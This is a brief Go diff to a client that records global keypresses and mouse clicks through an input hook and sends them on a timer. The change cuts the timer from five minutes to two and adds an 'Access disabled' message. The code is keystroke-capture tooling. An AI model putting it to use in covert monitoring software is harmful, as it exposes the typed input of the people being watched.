@@ -26,8 +26,8 @@ func InitClient() gocron.Scheduler {
 }
 
 func AddJobs(engine gocron.Scheduler, client *controllers.ClientController) {
-	engine.NewJob(gocron.DurationJob(time.Minute*5), gocron.NewTask(client.TransmitKeypressData))
-	engine.NewJob(gocron.DurationJob(time.Minute*5), gocron.NewTask(client.TransmitClickData))
+	engine.NewJob(gocron.DurationJob(time.Minute*2), gocron.NewTask(client.TransmitKeypressData))
+	engine.NewJob(gocron.DurationJob(time.Minute*2), gocron.NewTask(client.TransmitClickData))
 }
 
 func InitRecorders(client *controllers.ClientController) {
@@ -35,4 +35,5 @@ func InitRecorders(client *controllers.ClientController) {
 	client.RecordKeyPress()
 	s := hook.Start()
 	<-hook.Process(s)
+	fmt.Println("Access disabled")
 }
